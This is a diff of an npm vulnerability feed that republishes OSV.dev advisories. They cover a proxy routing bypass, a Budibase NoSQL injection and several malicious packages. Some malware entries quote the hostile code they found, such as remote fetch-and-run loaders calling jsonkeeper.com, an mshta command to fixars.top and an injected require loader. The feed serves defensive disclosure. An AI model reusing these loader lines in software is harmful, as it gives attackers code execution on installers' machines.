@@ -3,12 +3,1181 @@
   <title>OSV — new &amp; updated vulnerabilities: npm</title>
   <subtitle>Open-source vulns affecting npm packages, last 48h. Source: OSV.dev (CC-BY-4.0).</subtitle>
   <id>tag:cshintov.github.io,2026:osv-rss:npm</id>
-  <updated>2026-06-23T10:41:07Z</updated>
+  <updated>2026-06-23T18:29:29Z</updated>
   <link rel="self" href="https://cshintov.github.io/osv-rss/npm.xml"/>
   <link rel="alternate" href="https://osv.dev/"/>
   <author><name>osv-rss (data from OSV.dev)</name></author>
   <rights>Vulnerability data from OSV.dev and upstream sources (e.g. GitHub Advisory Database), licensed CC-BY-4.0.</rights>
   <generator uri="https://github.com/cshintov/osv-rss">osv-rss</generator>
+  <entry>
+    <title>[UPDATED] GHSA-64mm-vxmg-q3vj: http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass</title>
+    <id>https://osv.dev/vulnerability/GHSA-64mm-vxmg-q3vj</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-64mm-vxmg-q3vj"/>
+    <published>2026-06-18T13:06:11Z</published>
+    <updated>2026-06-23T18:29:29Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-55602"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55602&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;http-proxy-middleware&lt;/code&gt; — fixed in 3.0.6&lt;/li&gt;&lt;li&gt;&lt;code&gt;http-proxy-middleware&lt;/code&gt; — fixed in 4.1.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;http-proxy-middleware&lt;/code&gt; — fixed in 2.0.10&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;# Summary
+
+`http-proxy-middleware` documents `router` proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted `Host` header that is only a superstring match for a configured host+path key can still route a request to an unintended backend.
+
+# Details
+
+Tested code state:
+
+- validated on tag `v4.0.0-beta.5`
+- corresponding commit: `339f09ede860197807d4fd99ed9020fa5d0bd358`
+
+Relevant code locations:
+
+- `src/router.ts`
+- `src/http-proxy-middleware.ts`
+
+Affected public API:
+
+- `createProxyMiddleware({ router: { &amp;#x27;host/path&amp;#x27;: &amp;#x27;http://target&amp;#x27; } })`
+
+Code explanation:
+
+When a proxy-table router key contains `/`, `getTargetFromProxyTable()` concatenates attacker-cont…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj"&gt;https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/chimurai/http-proxy-middleware"&gt;https://github.com/chimurai/http-proxy-middleware&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-64mm-vxmg-q3vj"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-8qv3-p479-cj62: Budibase has nonymous NoSQL operator injection via published-app query templates</title>
+    <id>https://osv.dev/vulnerability/GHSA-8qv3-p479-cj62</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-8qv3-p479-cj62"/>
+    <published>2026-06-23T17:43:10Z</published>
+    <updated>2026-06-23T17:45:08Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-54350"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Budibase has nonymous NoSQL operator injection via published-app query templates&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-54350&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@budibase/server&lt;/code&gt; — fixed in 3.39.12&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+`enrichContext` at `packages/server/src/sdk/workspace/queries/queries.ts:121-138` substitutes parameter values into the raw JSON body of a query, then `JSON.parse`s the result. The validator `validateQueryInputs` at `packages/server/src/api/controllers/query/index.ts:61-71` rejects only Handlebars markers (`{{`, `}}`) in user input and does not escape JSON metacharacters (`&amp;quot;`, `\`, `}`). A parameter value containing a closing quote and additional keys lifts attacker-controlled fields into the parsed filter object.
+
+For Mongo `find`, the parsed filter passes directly to `collection.find()` (`packages/server/src/integrations/mongodb.ts:506-510`). Duplicate-key JSON parsing overrides the builder&amp;#x27;s `{name: &amp;quot;...&amp;quot;}` with `{name: {$exists: true}}` and returns every document. The same …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/Budibase/budibase/security/advisories/GHSA-8qv3-p479-cj62"&gt;https://github.com/Budibase/budibase/security/advisories/GHSA-8qv3-p479-cj62&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/Budibase/budibase"&gt;https://github.com/Budibase/budibase&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-8qv3-p479-cj62"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6274: Malicious code in web3-token-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6274</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6274"/>
+    <published>2026-06-22T22:38:59Z</published>
+    <updated>2026-06-23T17:16:25Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-3w2v-mxgh-g2fw"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in web3-token-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-3w2v-mxgh-g2fw&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;web3-token-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (0c826bf782895b60580b94e3a28a2c4562d3742420ce81e9895ad8568da57890)
+The package advertises itself as a Web3 fee utility but its main export is a dropper. index.js line 140 base64-decodes a platform-specific command string and executes it via child_process.exec inside the exported calculateFee() function — the exact call the README documents as the headline usage example (`calculateFee(100, 2)`). The decoded commands branch on host OS and fetch attacker binaries from https://www.mythicalsgames.com/files/sean/ (a typosquat of the legitimate mythicalgames.com; the path segment `sean` matches package.json&amp;#x27;s `author: &amp;quot;sean&amp;quot;`): on Windows, PowerShell with `-W Hidden` downloads SvcHostUpdate.exe into the user…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.1.1"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.1.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.2.1"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.2.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.2.0"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.2.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.0.1"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.0.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-token-helper/v/1.1.2"&gt;https://www.npmjs.com/package/web3-token-helper/v/1.1.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-3w2v-mxgh-g2fw"&gt;https://github.com/advisories/GHSA-3w2v-mxgh-g2fw&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6274"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6300: Malicious code in chalk-ultra (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6300</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6300"/>
+    <published>2026-06-23T15:25:21Z</published>
+    <updated>2026-06-23T17:16:25Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-vgq4-6c53-5826"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in chalk-ultra (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-vgq4-6c53-5826&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;chalk-ultra&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (9a219b45c3fdcdb883eeb2c7e74d20060af2c788865e7925f911e40276dcd631)
+chalk-ultra is published under a name that mimics the widely-used `chalk` package, but its `main` is a verbatim copy of nodemailer source and its `package.json` declares `&amp;quot;postinstall&amp;quot;: &amp;quot;node lib/utils/index.js&amp;quot;`. The postinstall path detaches into `lib/utils/smtp-connection/index.js`, which executes `require(&amp;quot;axios&amp;quot;).get(&amp;quot;https://jsonkeeper.com/b/OMNQZ&amp;quot;).then(r=&amp;gt;new Function(&amp;quot;require&amp;quot;,r.data.cookie)(require))` — fetching JavaScript from a public, mutable paste host and evaluating it via `new Function` with the installer&amp;#x27;s `require` and full process privileges at install time. A sibling file `lib/utils/smtp-connection/parse.js` exports…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/chalk-ultra/v/12.0.3"&gt;https://www.npmjs.com/package/chalk-ultra/v/12.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/chalk-ultra/v/12.0.15"&gt;https://www.npmjs.com/package/chalk-ultra/v/12.0.15&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/chalk-ultra/v/12.0.14"&gt;https://www.npmjs.com/package/chalk-ultra/v/12.0.14&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-vgq4-6c53-5826"&gt;https://github.com/advisories/GHSA-vgq4-6c53-5826&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6300"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-5929: Malicious code in backoffice-charges-module (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-5929</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-5929"/>
+    <published>2026-06-16T22:30:57Z</published>
+    <updated>2026-06-23T17:16:25Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-mmhq-hrgp-xjhx"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in backoffice-charges-module (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-mmhq-hrgp-xjhx&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;backoffice-charges-module&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (047eb92a0e8bb401b2c205765616c9b4b715ee7cfd33d2e6ef9dc8d645b77f04)
+On every `npm install`, the `preinstall` lifecycle script (`node index.js &amp;gt; /dev/null 2&amp;gt;&amp;amp;1`) silently HTTPS-POSTs a JSON payload to `https://avamnrwqo7.rbmock.dev/` containing the package name, a generated execution_id, `process.version`, `process.platform`, `process.arch`, and an ISO timestamp. Output is redirected to /dev/null to hide the network call from the installer. The package has empty description, author &amp;#x27;poc&amp;#x27;, declares a `main.js` that is not shipped, and uses an artificially high version number (1.999.0) — classic dependency-confusion/typosquat reconnaissance signals. The beacon allows whoever controls `avamnrwqo7.rbmock.de…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/backoffice-charges-module/v/1.999.0"&gt;https://www.npmjs.com/package/backoffice-charges-module/v/1.999.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/backoffice-charges-module/v/2.999.1"&gt;https://www.npmjs.com/package/backoffice-charges-module/v/2.999.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/backoffice-charges-module/v/2.999.0"&gt;https://www.npmjs.com/package/backoffice-charges-module/v/2.999.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-mmhq-hrgp-xjhx"&gt;https://github.com/advisories/GHSA-mmhq-hrgp-xjhx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-5929"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6331: Malicious code in calculate-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6331</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6331"/>
+    <published>2026-06-23T15:54:53Z</published>
+    <updated>2026-06-23T17:16:25Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-3cmh-x7h7-f97c"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in calculate-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-3cmh-x7h7-f97c&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;calculate-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (7a23ca03d834e21ee4ba3040e377b27097b9811e7d537e359c1b50b5aa15fdef)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-3cmh-x7h7-f97c"&gt;https://github.com/advisories/GHSA-3cmh-x7h7-f97c&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6331"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6330: Malicious code in @ravespaceio/rave-engine (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6330</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6330"/>
+    <published>2026-06-23T16:00:18Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-72c8-h2pr-vwjg"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @ravespaceio/rave-engine (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-72c8-h2pr-vwjg&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@ravespaceio/rave-engine&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (4744e569e605ac6d749c8611417ad75dfd4d32f30fb6a75d5bcfa211d126bbd6)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-72c8-h2pr-vwjg"&gt;https://github.com/advisories/GHSA-72c8-h2pr-vwjg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6330"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6329: Malicious code in @ravespaceio/browser-input (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6329</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6329"/>
+    <published>2026-06-23T16:00:18Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-w9pc-2fqh-jmjg"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @ravespaceio/browser-input (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-w9pc-2fqh-jmjg&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@ravespaceio/browser-input&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (4814ac9a416bc2053c14cc597f4587bca639c752bba54c8429c4be9b49f3137b)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-w9pc-2fqh-jmjg"&gt;https://github.com/advisories/GHSA-w9pc-2fqh-jmjg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6329"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6328: Malicious code in @muaththir/api (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6328</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6328"/>
+    <published>2026-06-23T16:11:16Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-vxx9-pq69-m5rh"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @muaththir/api (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-vxx9-pq69-m5rh&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@muaththir/api&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (9ec22d0ad4c63f404155299bfcc188c3807cc2b1476a70fda3b55280e2f637ba)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-vxx9-pq69-m5rh"&gt;https://github.com/advisories/GHSA-vxx9-pq69-m5rh&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6328"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6334: Malicious code in parket-flow (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6334</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6334"/>
+    <published>2026-06-23T15:27:33Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-gfmc-wgpr-h6vg"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in parket-flow (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-gfmc-wgpr-h6vg&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;parket-flow&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (4a16b4d37e2525d236562aba3e3562dd73f016e89f417ebead9c82dcbb668d85)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-gfmc-wgpr-h6vg"&gt;https://github.com/advisories/GHSA-gfmc-wgpr-h6vg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6334"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-5927: Malicious code in aillmgen (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-5927</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-5927"/>
+    <published>2026-06-16T22:09:54Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-cqfc-w7g9-4c7p"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in aillmgen (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-cqfc-w7g9-4c7p&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;aillmgen&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (5b303e830a204ad1ee237f0403a2844f5dce96fa3e3841392ce92d7f3f502341)
+On `npm install`, the package&amp;#x27;s preinstall hook (preinstall.js) runs `exec(&amp;#x27;cmd /c &amp;quot;mshta http://fixars.top&amp;quot;&amp;#x27;)`, invoking the Windows mshta.exe binary to fetch and execute an HTA payload from http://fixars.top with the installer&amp;#x27;s privileges. mshta is a well-known living-off-the-land binary that executes arbitrary HTA/JScript/VBScript content directly from a remote URL, giving the operator of fixars.top remote code execution on any Windows machine that installs this package. The remote endpoint is plain HTTP and attacker-mutable, and the behavior is unrelated to the package&amp;#x27;s stated LLM-client purpose (the library code references an Ea…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/aillmgen/v/4.0.2"&gt;https://www.npmjs.com/package/aillmgen/v/4.0.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-cqfc-w7g9-4c7p"&gt;https://github.com/advisories/GHSA-cqfc-w7g9-4c7p&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-5927"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6267: Malicious code in vitest-cli (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6267</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6267"/>
+    <published>2026-06-22T18:23:57Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-c35r-fwrq-cgq9"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in vitest-cli (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-c35r-fwrq-cgq9&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vitest-cli&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (27abcc7f2373309feb253b0cc48b1a8bae7c54a3c43aed0c57add697f4067aba)
+Package name `vitest-cli` impersonates the official Vitest project while declaring empty `author`, `homepage`, `repository`, and `bugs` metadata. The `package.json` declares `scripts.postinstall: node scripts/postinstall.js`, which auto-runs on every `npm install`. The postinstall reaches `lib/postinstall/index.js` line 23, which evaluates a P.A.C.K.E.R.-obfuscated blob via `eval((function(p,a,c,k,e,d){...})(...))`. Once decoded, the payload calls `axios.get(&amp;#x27;https://jsonkeeper.com/external/W33XO&amp;#x27;)` and executes the response&amp;#x27;s `data.cookie` field with `new Function(&amp;#x27;require&amp;#x27;, r.data.cookie)(require)`, retrying up to three times with 10…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.3"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.7"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.0"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.9"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vitest-cli/v/1.0.4"&gt;https://www.npmjs.com/package/vitest-cli/v/1.0.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-c35r-fwrq-cgq9"&gt;https://github.com/advisories/GHSA-c35r-fwrq-cgq9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6267"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6323: Malicious code in ts-sudo (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6323</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6323"/>
+    <published>2026-06-23T15:32:53Z</published>
+    <updated>2026-06-23T17:16:24Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-9rpr-8v3f-2g5q"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ts-sudo (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-9rpr-8v3f-2g5q&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ts-sudo&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (1a6e18b2d6bef04dd8377fac8d9b20e5545f1ec39875fdd308adf118b6f319d1)
+The package publishes under the name `ts-sudo` but ships a verbatim copy of the big.js v7.0.1 source (`big.js`, `big.mjs`) along with big.js&amp;#x27;s description, repository URL (`MikeMcl/big.js`), and keyword set (`bignumber`, `bigint`). Inside the otherwise-legitimate big.js source, a loader has been injected at `big.js:606`: `try { const doc = require(&amp;quot;parket-helper&amp;quot;); doc.from_str().then(e =&amp;gt; { }).catch(e =&amp;gt; { }) } catch (error) { }`. The same injection is present in `big.mjs`. This block fires automatically on `require(&amp;#x27;ts-sudo&amp;#x27;)` / `import &amp;#x27;ts-sudo&amp;#x27;`, silently invoking `parket-helper.from_str()` — a package the consumer never chose to d…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ts-sudo/v/1.0.0"&gt;https://www.npmjs.com/package/ts-sudo/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-9rpr-8v3f-2g5q"&gt;https://github.com/advisories/GHSA-9rpr-8v3f-2g5q&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a 